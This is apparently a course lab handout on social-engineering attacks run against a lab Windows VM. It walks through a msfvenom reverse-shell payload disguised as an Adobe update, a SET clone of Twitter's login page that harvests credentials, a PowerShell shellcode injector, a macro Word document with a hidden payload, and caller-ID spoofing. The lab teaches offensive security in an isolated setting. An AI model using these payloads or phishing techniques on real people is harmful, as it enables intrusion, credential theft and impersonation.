---

title: "Lab: Social Engineering"
number: 11
description: "Only amateurs attack machines; professionals target people."
published: true
---

Today, social engineering attacks represent a major primary vector for hackers.
As Bruce Schneier [said][1], “Only amateurs attack machines; professionals target people.”
Further, client-side software represents a much larger attack surface than
server-side software. For these reason, many of the major breaches you read
about in the news began with a client-side attack.

[1]: https://www.schneier.com/crypto-gram-0010.html

In this lab you’ll use two leading tools to perform client-side attacks:
`msfvenom` and the Social Engineering Toolkit (SET). All of these attacks involve
creating a malicious payload
that you trick the user into executing. Both `msfvenom` and `set` use the Metasploit-Framework
to create the payloads, and you are on your own to trick the user.


# Part 1. MSFVenom with fake AdobeUpdate.exe

In this section, you’ll use `msfvenom` to perform a client-side attack.
Your goal is to (1) create a malicious executable file and (2) host it on a web server.
Following this, you will play the role of the victim using the Windows VM, and
you will (3) download and (4) run the payload, leading to the Windows VM being
exploited.

1.    Log in to Kali. Start up the Windows virtual machine.

## Play the attacker

4.    In Kali, type `msfvenom --list formats` to see a list of output formats that
      msfvenom supports. Examine the "Framework Executable Formats" section.
      We’ll use `exe` option (via `-f exe`) option to create a Windows executable.
5.    In Kali, run the following command, all on one line:

          msfvenom -p windows/meterpreter/reverse_tcp LHOST=virbr1 -f exe > /tmp/AdobeUpdate.exe

      Where:

      * `-p` -- selects the payload to be the same one we used during the exploitation lab -- `meterpreter`.
      * `-f exe` -- selects the file type of the output executable
      * `LHOST=virbr1` -- sets LHOST to be the name of the adapter on which Kali has its 192.168.56.0/24 address. msfconsole should translate it for us.
      * `> /tmp/AdobeUpdate.exe` -- redirects the output from running the `msfvenom` command into a file called `AdobeUpdate.exe`, stored in the `/tmp` directory.

        <div class='alert alert-info'>This is not actually an Adobe Update! This is our payload, <em>disguised</em>.</div>

6.    Verify that the output file is about 73802 bytes in size. If not, you may need to check that you entered the command correctly and run it again.
10.   Run an `msf` handler to listen for the meterpreter reverse connection which will be incoming
      when our malicious `AdobeUpdate.exe` payload file is executed.

      11.   On Kali, open a new terminal window and enter `msfconsole`.
      11.   Enter `use exploit/multi/handler`.

            Once you’ve switched to this exploit module, type `show info`.
            Note that this module “is a stub that provides all of the features of
            the Metasploit payload system to exploits that have been launched
            outside of the framework.” A stub adds additional functionality to
            other exploits.
      12.   Enter `set PAYLOAD windows/meterpreter/reverse_tcp`.
      13.   Enter `set LHOST virbr1`.
      15.   Enter `exploit -j`.

            <div class='alert alert-info'>
            The <code>-j</code> option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
            </div>

            <div class='alert alert-info'>
            Because <code>ExitOnSession</code> is set to <code>True</code> (the default for <code>exploit/multi/handler</code>; verify with <code>show advanced</code> from msfconsole), your handler will die after it gets one connection.
            </div>

      The handler is now listening.

7.    Now, we need to set up a way to deliver the payload to the victim.
      Set up a web server to host your malicious file.

      8.  Change directories to `/tmp` by entering `cd /tmp` in a kali terminal.
      8.  Check that the payload you generated earlier is in this directory: run `ls`
      9.  Now, from that directory, run the following command to use an http
          webserver built into `python` to serve content from the current directory (`/tmp`)
          on an arbitrary port - `8888`:

              python3 -m http.server 8888

## Play the victim

16.  Now, switch to playing the role of the victim. On your Windows VM, using
     Chrome, navigate to `http://192.168.56.101:8888`. Click `AdobeUpdate.exe` to
     download it. Click it to execute it. On the "Windows protected your PC"
     security dialog that appears, click "More info" and then "Run anyway."

     {% include lab-image.html image='adobe-update-execute-more-info.png' %}

     {% include lab-image.html image='adobe-update-execute-run-anyway.png' %}

## Play the attacker again

17.   On your Kali VM, you should see in your msfconsole that “Command shell session `X` opened,”
      where X is the number of the new session. Congratulations!

      Type:

          sessions -i [the number of the new session]

      This should open a connection to a meterpreter on the Windows VM.

17. Run `shell` to drop down into a windows cmd prompt
    18.   Type `whoami` to see the privileges that you are running under.
          Note that these are the privileges of the user of your Windows VM.
    19.   Run the command `netstat -n` to see a listing of open connections on
          the Windows server. Note the “ESTABLISHED” connection from the Windows VM to your Kali VM.
    20.   Return to your meterpreter shell by running `exit` to leave the cmd prompt.
20. Carry out any nefarious purpose you have in mind for the victim -- yourself <i class='fa fa-birthday-cake'></i>


## Deliverable

Take a screenshot showing the output of running the following commands from your meterpreter session:

    pgrep AdobeUpdate.exe
    getpid
    shell
    echo "your first and last name"
    date /t

The first command should show the process id related to your trojan pdf, and the second verifies that you are tied to that process.
This establishes that you were successful in this exploit.

The `shell` command drops you into a windows shell where you can more easily establish your identity.

Once you have completed these steps, you can close your meterpreter session, but you may wish to leave
your `/tmp` http.server running for later lab parts.


# Part 2. Social Engineering Toolkit (SET) -- Site Cloner

In this section, you’ll use the Social Engineering Toolkit (SET) to craft social engineering attacks.

1.   In a Kali shell, navigate to the `/opt/setoolkit` directory and run the command
     `./setoolkit` (don’t forget the `./`). Agree to the terms of service. You should see a screen like the following:

     {% include lab-image.html image='lab_11_2.png' width="50%" %}

2.   Enter option `1` for social-engineering attacks. That should display this menu:

     {% include lab-image.html image='lab_11_3.png' width="50%" %}

3.   Select option `2` for website attack vectors. The next menu will list the various web attack vectors:

     {% include lab-image.html image='lab_11_4.png' width="50%" %}

4.   Select number `3` for a credential harvesting attack. This brings you to the following screen:

     {% include lab-image.html image='lab_11_5.png' width="50%" %}

5.   Select option `2` to clone a target website. This is a very sophisticated feature that can clone
     almost any website.

     After you’ve selected this feature, you’ll need to set an IP address to host
     the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to `192.168.56.101`,
     the IP address of Kali Linux for the host-only network. If SET already displays the correct IP address
     in brackets (e.g., "[192.168.56.101]"), just push enter.

     Now you get to choose the website to clone. However, not all websites' login processes can be automatically cloned.
     One login page that was verified to work as of November 2020 is `https://twitter.com` -- set this address as the one
     to clone.

     **Note:** Be sure you enter "https" in the URL.

     If all has gone well, you should see a screen like the following:

     {% include lab-image.html image='set-site-cloner.png' %}

6.   Now it’s time to script the phishing message to send. At this point, an attacker would use a tool or service to send a
     spoofed email. For simplicity, skip this step and instead send an email to your own email account with the message:

     > “You are receiving this email because there is a problem with your account. Please go to twitter.com and login to verify your account."

     Use rich text formatting to make `twitter.com` a hyperlink that points to the IP of your Kali VM: `http://192.168.56.101`.

     Open the email in your Windows VM. When you receive the email, click the link.

     <div class='alert alert-info'>Alternatively, simply <em>imagine</em> that you sent yourself the above email,
     and visit
     <code>http://192.168.56.101</code> from a browser within the Windows VM.</div>

     You should be looking at whatever the current Twitter.com login page looks like -- a cloned copy!

     {% include lab-image.html image='twitter-login.png' %}

     **Note:** the address bar indicates the actual IP of the attacker. This is the biggest indication
     that the site is forged. If this were a more sophisticated attempt, the attacker would obtain a
     domain that looked similar to Twitter (like `twatter.com`). To easily obtain a phishing url,
     an attacker could use a site like [http://freedns.afraid.org](http://freedns.afraid.org).

8.   Enter fake credentials into the fields on the spoofed website, and click the login button on the website.
     On your Kali VM, you should see something similar to this in your terminal window:

     {% include lab-image.html image='lab_set_facebook.png' width="50%" %}

     **Note:** You may need to scroll up in your terminal window to find your username and password. Some of the "possible username field
     found" messages may be false positives. Just scroll up until you see your username and password.


## Deliverable

Take a screenshot of `setoolkit` reporting the capture of credentials you enter onto whatever site you spoofed. The screengrab should show:

*   `POSSIBLE USERNAME FIELD FOUND: <your first and last name>`
*   `POSSIBLE PASSWORD FIELD FOUND: <the password you entered>`


<div class='alert alert-info' markdown='1'><strong>Convenience Tip!</strong> The pattern from Part 1 of
(1) generate a payload and (2) set up a handler to listen for a callback
is common enough that SET gives you a higher-level interface for doing the same thing.
For instance, the AdobeUpdate.exe steps in the earlier task could have been replaced with the following in `setoolkit`:

From the SET main menu:

* Choose `1) Spear-Phishing Attack Vectors`
* Choose `4) Create a Payload and Listener`
* Choose `2) Windows Reverse_TCP Meterpreter`
* choose a LHOST and free PORT...
* allow SET to set up a listener for you (`yes`)

</div>


# Part 3. Social Engineering Toolkit (SET) -- PowerShell Shellcode Injector

PowerShell is a powerful scripting language built into the Windows operating system. In this section, you will generate an encoded PowerShell script and
execute it on Windows which opens a Meterpreter session on attacker’s machine.


1.   Launch `setoolkit`. If it was already launched, close it and then launch it anew.
1.   From the main menu, choose `1` for `Social-Engineering Attacks`.
1.   Then, choose `9` for `PowerShell Attack Vectors`.
3.   Within this submenu, select `1` for `PowerShell Alphanumeric Shellcode Injector`.
4.   Enter your Kali VM IP address `192.168.56.101` and accept the default of port `443`. Choose `yes` to start the listener.
     This will automatically open `msfconsole` and run some commands for you to set up a listener like you did manually in Part 1.
5.   Open another terminal and navigate to `/root/.set/reports/powershell/`
6.   From that directory, open the script using the `leafpad` command:

          leafpad x86_powershell_injection.txt


     {% include lab-image.html image='powershell-save-payload.png' %}

7.   Copy the entire script you found on `leafpad` to the clipboard. On Windows, open a command line prompt (search for and run `cmd`).

     {% include lab-image.html image='windows-run-cmd.png' %}

     Then, paste (right-click once, and be patient!) the script on the windows command line. Then press `enter`.

     The command prompt should disappear -- this is part of the payload script.

     Shortly after, you should see an opened Meterpreter session. Congratulations! Get the session id with `sessions` if you don't already
     see it, and then interact with that session with `sessions [id]`

     **Optional:** you can save the entire script as a windows batch file (.bat), then trick the user to run that file.

<div class='alert alert-info'><strong>Consider: </strong>What ways might you trick a user into running this script?</div>

## Deliverable

Take a screenshot showing the output of running the following commands from your meterpreter session:

    pgrep powershell
    getpid
    shell
    echo "your first and last name"
    date /t

# Part 4. Create a Malicious Microsoft Word Document

In this section, you will create a macro-enabled Microsoft Word file that opens a Meterpreter session on an attacker’s machine.
Note that this exploits a _feature_ of Word -- not an inherent security vulnerability per se. For this reason, this attack
vector will work as long as you can convince a user to open the Word file and enable some settings.

The first step is to create the malicious macro-embedded Word document, acting as the attacker.
You will need access to Microsoft Word in order
to do this. This part of the lab includes instructions for installing an evaluation version of Microsoft Word into the Windows virtual
machine on Kali.

It is admittedly a bit odd to be, acting as an attacker, using the victim's machine to create a malicious document that we want the
victim to run on that very machine, but so be it.

Know that if you tried to use Word on a system running antivirus protection, it would likely prevent you from creating the malicious
document, because it would detect that the document contained commands to launch a hidden shell (meterpreter).
Rather than disable security settings on a system you rely on, use the lab's windows virtual machine for the document-creation
portion of this lab.

1.   In Kali, run the following command (all one line):

          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=virbr1 LPORT=7777 -e x86/shikata_ga_nai -f vba-exe > word-macro-exploit

     This will save the exploit to a file called `word-macro-exploit`
2.   Open `word-macro-exploit` using `leafpad`, and read the beginning of the output. It explains that the output is
     divided into two sections: A "Macro" section and a "Payload" section.

     We will need to put the "Macro" section into a VBA module attached to a Word document,
     and the "Payload" section into the body text of the Word document.

     The "Payload" is byte-code that the macro will read and write out into a file on the
     victim machine, after which it will execute the newly-created executable.

3.   In Kali, use `msfconsole` to spin up a listener that will wait for a connection from our Word meterpreter payload:

          use exploit/multi/handler
          set payload windows/meterpreter/reverse_tcp
          set LPORT 7777
          set LHOST virbr1
          set ExitOnSession false
          exploit -j

4.   Install Word into the Windows virtual machine.

     The version of Word that gets installed on the lab virtual machine only works for 5 days without a product key.
     The first time that you install windows to your virtual machine, you can run the following from kali as root:

         cd /root/vagrant-boxes/lab-windows-2019-vuln/
         git pull
         vagrant provision --provision-with install-windows

     The installation process takes about two minutes.

     If your activation grade period expires and you still need access to Word on your Windows VM, you can get a fresh start
     by running the full vagrant destroy-up-provision cycle again, via running the following script **as root**:

         wget -O - https://raw.githubusercontent.com/deargle/kali-xfce-gcp-qemu-packer/master/kali-pentest-lab/update-server2019.sh

1.   Open Word. Accept whatever defaults for the welcoming prompts.

1.   Enable the Developer tool access button on the Word ribbon:

     * From Word's `File` tab, select `Options`.
     * Then, select “Customize Ribbon” from the left-hand side menu
     * Check the `Developer` checkbox (see screenshot below).

     {% include lab-image.html image='lab_11_8.png' width="70%" %}

2.  From the Developer ribbon, select “Visual Basic” to open the Visual Basic editor.


    {% include lab-image.html image='word-ribbon-developer-visual-basic.png' %}

    Inside the visual basic editor, right-click the document, select `Insert > Module`.

    {% include lab-image.html image='word-vba-insert-module.png' %}

    Copy all of the code from the "Macro" section of your `word-macro-exploit` file on Kali,
    and paste it into your new VBA module:

    {% include lab-image.html image='word-macro-exploit-copy-macro.png' %}

    **Important for getting credit!** About 33 lines into the VBA code, you will see a line with a variable assignment some random gibberish that ends in `.exe`. You will need to know the
    random gibberish later for the deliverable for this question. Example:

    {% include lab-image.html image='word-macro-exploit-example-exe.png' %}

    "Save" the VB module, selecting a Word macro-enabled document (`.docm`). Close the VB editor.

    {% include lab-image.html image='word-macro-exploit-save-as.png' %}

5.  Next, in the main body of the Word document, paste the payload hex code from the kali output textfile. Save the document again.

    {% include lab-image.html image='word-macro-exploit-copy-payload.png' %}

    At this point, the payload is fully functional. However, a good social engineer would disguise the document, to allay suspicion. The following ideas are subjective artistry.

    * Above the hex code, type a simple memo as the ostensible content of the memo.
    * Highlight the hex code you pasted in and change the font size to “1” and the font color to white.
    * Rename the file to something like “Sales Memo.”

    This will make the hex code difficult to find for anyone who opens the document.

6.  Test your malicious Word file by opening it on the Windows VM. If Word asks,
    `enable macro content` (look for a yellow bar on the top
    of the Word document window).

    {% include lab-image.html image='word-macro-exploit-enable-content.png' %}

    In the Kali VM, you should now see that a Meterpreter session has been opened to the host workstation.

    If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).

    **Optional:** Use the sendEmail command on Kali to send a spoofed email with the malicious Word file as an attachment. To see how the sendEmail command works, type `man sendEmail.`

## Deliverable

Take a screenshot showing the output of running the following commands from your meterpreter session:

    ps -S <first few letters of your gibberish.txt>
    getpid
    shell
    echo "your first and last name"
    date /t

This will establish that your random gibberish.exe is running, and that your meterpreter process is tied to that process.

See the example below:

{% include lab-image.html image='word-macro-exploit-deliverable.png' %}


# Part 5. Spoof your phone number

In this section, you’ll use the app [SpoofCard](https://www.spoofcard.com) to spoof your phone number when making a call.
This is a common technique used by social engineers to lend credibility to their calls when
[vishing](https://en.wikipedia.org/wiki/Voice_phishing). According to [Social-Engineer.org](https://www.social-engineer.org/framework/se-tools/phone/caller-id-spoofing/):

> Caller ID has become a common place technology in both business and home use. Especially with the advance of cell phones replacing many of the phone lines people use, caller ID is part of our daily life. Being aware of this fact and how to use this to your advantage is a must for a successful social engineer.

> The basic principal behind caller ID spoofing is to change the information that is displayed on the caller ID display. A few of the points discussed in this framework under authority state that we can use the idea of authority and/or commitment to influence a person. An even stronger presence is the use of credibility. Building credibility can make or break a successful social engineer attack.

{% include lab-image.html image='spoofcard.png' %}

1. Download the SpoofCard app from the Apple App Store or Google Play Store.
2. Open the app and press `Get Free credits`.
3. Enter your true phone number and email address. Select a 4-6 digit pin. Check the terms of service box, and press `Sign up`.
4. Enter the number of a friend you would like to call in the field `Number to call`.
5. Enter the number of a mutual friend that you would like to spoof in the field `Caller ID to Display`.
6. If you want, select the `Voice Changer` button to change your voice. Optionally, select the
   `background noise` option and select a background noise.
7. Select `Call`. The app will show an intermediary SpoofCard phone number to call. Tap to call that number so that the SpoofCard service will call your friend.
8. For a moment, pretend to be your mutual friend before explaining that you spoofed the call.

See [Social-Engineer.org](https://www.social-engineer.org/framework/se-tools/phone/caller-id-spoofing/) for more information about this type of attack.
